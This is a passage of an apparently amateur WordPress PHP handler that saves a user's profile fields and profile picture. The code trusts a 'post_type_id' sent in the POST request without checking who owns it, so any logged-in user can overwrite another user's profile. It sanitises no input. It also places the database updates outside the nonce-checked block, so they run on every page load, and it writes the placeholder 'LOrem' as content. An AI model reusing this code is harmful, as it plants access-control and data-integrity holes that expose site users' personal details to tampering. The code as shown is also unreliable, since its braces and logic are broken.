    if (isset( $_POST["mars_update_nonce"] ) && wp_verify_nonce($_POST['mars_update_nonce'], 'mars_update_nonce')) {
        if ( !is_user_logged_in() ) {
            wp_redirect( home_url('/login'), 302 );
            exit();
        }
        $post_type_id    = $_POST["post_type_id"];
        $about_user      = $_POST["about_user"];
        $phone_no        = $_POST["phone_no"];
        $date_of_birth   = $_POST['date_of_birth'];
        $country         = $_POST['country'];
        $region          = $_POST['region'];
        $city            = $_POST['city'];
        $age             = $_POST['age'];
        $gender          = $_POST['gender'];
        $interests       = $_POST['interests'];
        $language        = $_POST['language'];
        $hair_color      = $_POST['hair_color'];
        $eyes_color      = $_POST['eyes_color'];
        $body_type       = $_POST['body_type'];
        $height          = $_POST['height'];
        $weight          = $_POST['weight'];



        //     // UPLOAD PROFILE PICTURE
        // Move file to media library
        //     // UPLOAD PROFILE PICTURE
        // Move file to media library
        if ( !function_exists('wp_handle_upload') ) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
        }
        $profile_picture        = $_POST["profile_picture"];
        // UPLOAD DOCUMENTS HERE
        //     // UPLOAD PROFILE PICTURE
        // Move file to media library
        $movefile = wp_handle_upload( $_FILES['profile_picture'], array('test_form' => false) );
        // If move was successful, insert WordPress attachment
        if ( $movefile && !isset($movefile['error']) ) {
            $wp_upload_dir = wp_upload_dir();
            $attachment = array(
                'guid' => $wp_upload_dir['url'] . '/' . basename($movefile['file']),
                'post_mime_type' => $movefile['type'],
                'post_title' => preg_replace( '/\.[^.]+$/', "", basename($movefile['file']) ),
                'post_content' => "",
                'post_status' => 'inherit'
            );
            $attach_id = wp_insert_attachment($attachment, $movefile['file']);
            // Assign the file as the featured image
            set_post_thumbnail($post_type_id, $attach_id);
            update_field('profile_picture', $attach_id, $post_type_id);
        }
    }
    // UPLOAD PROFILE PICTURE ENDS
    $my_post = array(
        'ID'           =>  $post_type_id,
        'post_content' => "LOrem",
    );
    // Update the post into the database
    wp_update_post( $my_post);
    update_field('about_user' ,$about_user ,$post_type_id);
    update_field('phone_no' ,$phone_no ,$post_type_id);
    update_field('date_of_birth' ,$date_of_birth ,$post_type_id);
    update_field('country' ,$country ,$post_type_id);
    update_field('region' ,$region ,$post_type_id);
    update_field('city' ,$city ,$post_type_id);
    update_field('age' ,$age ,$post_type_id);
    update_field('gender' ,$gender ,$post_type_id);
    update_field('interests' ,$interests ,$post_type_id);
    update_field('language' ,$language ,$post_type_id);
    update_field('hair_color' ,$hair_color,$post_type_id);
    update_field('eyes_color',$eyes_color ,$post_type_id);
    update_field('body_type' ,$body_type ,$post_type_id);
    update_field('height' ,$height ,$post_type_id);
    update_field('weight' ,$weight,$post_type_id);

}
add_action('init', 'mars_update_profile');
///User rofile
/* End COde */